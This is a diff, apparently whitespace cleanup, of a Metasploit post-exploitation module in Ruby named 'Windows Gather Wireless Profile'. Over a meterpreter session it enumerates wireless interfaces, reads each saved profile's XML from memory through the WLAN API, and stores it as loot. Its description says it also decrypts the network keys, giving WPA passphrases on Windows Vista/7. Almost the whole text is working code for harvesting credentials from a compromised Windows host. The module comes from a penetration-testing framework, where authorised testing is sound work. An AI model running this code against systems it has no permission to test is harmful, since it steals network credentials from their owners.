@@ -14,47 +14,40 @@ require 'rex'
 
 
 class Metasploit3 < Msf::Post
-	
 	include Msf::Auxiliary::Report
 
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Gather Wireless Profile',
-				'Description'   => %q{
-					This module extracts saved Wireless LAN profiles. It will also try to decrypt
-					the network key material. Behaviour is slightly different bewteen OS versions
-					when it comes to WPA. In Windows Vista/7 we will get the passphrase. In
-					Windows XP we will get the PBKDF2 derived key.
-				},
-				'License'       => MSF_LICENSE,
-				'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+			'Name'          => 'Windows Gather Wireless Profile',
+			'Description'   => %q{
+				This module extracts saved Wireless LAN profiles. It will also try to decrypt
+				the network key material. Behaviour is slightly different bewteen OS versions
+				when it comes to WPA. In Windows Vista/7 we will get the passphrase. In
+				Windows XP we will get the PBKDF2 derived key.
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
 	end
 
 	def run
-	
 		#Opens memory access into the host process
 		mypid = client.sys.process.getpid
 		@host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
 		@wlanapi = client.railgun.wlanapi
-		
-		
 		wlan_info = "Wireless LAN Profile Information \n"
-				
-		
 		wlan_handle = open_handle()
-		
 		wlan_iflist = enum_interfaces(wlan_handle)
-		
+
 		#Take each enumerated interface and gets the profile information available on each one
 		wlan_iflist.each do |interface|
 			wlan_profiles = enum_profiles(wlan_handle, interface['guid'])
 			guid = guid_to_string(interface['guid'])
-			
+
 			#Store all the information to be saved as loot
 			wlan_info << "GUID: #{guid} Description: #{interface['description']} State: #{interface['state']}\n"
 			wlan_profiles.each do |profile|
@@ -66,7 +59,7 @@ class Metasploit3 < Msf::Post
 		wlan_info.gsub!(/\x00/,"")
 		print_good(wlan_info)
 		store_loot("host.windows.wlan.profiles", "text/plain", session, wlan_info, "wlan_profiles.txt", "Wireless LAN Profiles")
-		
+
 		#close the Wlan API Handle
 		closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
 		if closehandle['return'] == 0
@@ -74,12 +67,10 @@ class Metasploit3 < Msf::Post
 		else
 			print_error("There was an error closing the Handle")
 		end
-		
 	end
 
 
 	def open_handle 
-	
 		begin
 			wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
 		rescue
@@ -87,26 +78,19 @@ class Metasploit3 < Msf::Post
 			return nil
 		end
 		return wlhandle['phClientHandle']
-	
 	end
 
 
 	def enum_interfaces(wlan_handle)
-	
-			
 		iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
 		pointer= iflist['ppInterfaceList']
-		
 		numifs = @host_process.memory.read(pointer,4)
 		numifs = numifs.unpack("V")[0]
-		
-		
 		interfaces = []
-		
+
 		#Set the pointer ahead to the first element in the array
 		pointer = (pointer + 8)
 		(1..numifs).each do |i|
-		
 			interface = {}
 			#Read the GUID (16 bytes)
 			interface['guid'] = @host_process.memory.read(pointer,16)
@@ -117,7 +101,7 @@ class Metasploit3 < Msf::Post
 			#Read the state of the interface (4 bytes)
 			state = @host_process.memory.read(pointer,4)
 			pointer = (pointer + 4)
-			
+
 			#Turn the state into human readable form
 			state = state.unpack("V")[0]
 			case state
@@ -142,36 +126,26 @@ class Metasploit3 < Msf::Post
 			end
 			interfaces << interface
 		end
-	
 		return interfaces
-	
 	end
 
 
 	def enum_profiles(wlan_handle,guid)
-	
 		profiles=[]
-		
-		
-	
 		proflist = @wlanapi.WlanGetProfileList(wlan_handle,guid,nil,4)
 		ppointer = proflist['ppProfileList']
 		numprofs = @host_process.memory.read(ppointer,4)
 		numprofs = numprofs.unpack("V")[0]
 		ppointer = (ppointer + 8)
-		
-		
 		(1..numprofs).each do |j|
 			profile={}
-			
 			#Read the profile name (up to 512 bytes)
 			profile['name'] = @host_process.memory.read(ppointer,512)
 			ppointer = (ppointer + 516)
-			
-			
+
 			rprofile = @wlanapi.WlanGetProfile(wlan_handle,guid,profile['name'],nil,4,4,4)
 			xpointer= rprofile['pstrProfileXML']
-			
+
 			#The size  of the XML string is unknown. If we read too far ahead we will cause it to break
 			#So we start at 1000bytes and see if the end of the xml is present, if not we read ahead another 100 bytes
 			readsz = 1000
@@ -180,27 +154,23 @@ class Metasploit3 < Msf::Post
 				readsz = (readsz + 100)
 				profmem = @host_process.memory.read(xpointer,readsz)
 			end
-			
+
 			#Slice off any bytes we picked up after the string terminates
 			profmem.slice!(profmem.index(/(\x00){2}/), (profmem.length - profmem.index(/(\x00){2}/)))
 			profile['xml'] = profmem
 			profiles << profile
 		end
-	
 		return profiles
 	end
 
 
 	#Convert the GUID to human readable form
 	def guid_to_string(guid)
-	
 		aguid = guid.unpack("H*")[0]
-		
 		sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2] 
 		sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
 		sguid << "-" + aguid[20,12] + "}"
 		return sguid
-
 	end
 
 end
